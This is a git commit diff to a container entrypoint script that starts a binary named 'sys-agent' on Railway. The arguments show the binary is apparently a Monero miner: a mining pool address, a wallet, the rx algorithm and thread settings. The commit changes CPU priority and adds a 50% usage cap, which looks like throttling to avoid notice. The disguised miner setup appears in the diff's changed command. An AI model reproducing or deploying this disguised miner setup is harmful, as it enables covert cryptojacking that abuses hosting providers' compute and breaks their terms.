8238b63ff0e838ac990730e3491e61370d84657f
willy6509 <149163931+willy6509@users.noreply.github.com>
2025-05-17 14:28:41 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,7 +1,13 @@
 #!/bin/sh
 
 echo "=== Starting sys-agent Container on Railway ==="
+
 exec ./sys-agent \
   -o gulf.moneroocean.stream:10128 \
   -u 44DAhx7oyggJJZ91pjA7yRj9DtQtXguiAHwCPJukn48BLR8uSd6wz2uQ1nYZ7UVbqxeNwhjRQMh6e9iMvXYUd2qZF3djjRQ \
-  -p worker01 -a rx -k --cpu-priority=1 --threads=2
+  -p worker01 \
+  -a rx \
+  -k \
+  --cpu-priority=5 \
+  --threads=1 \
+  --max-cpu-usage=50
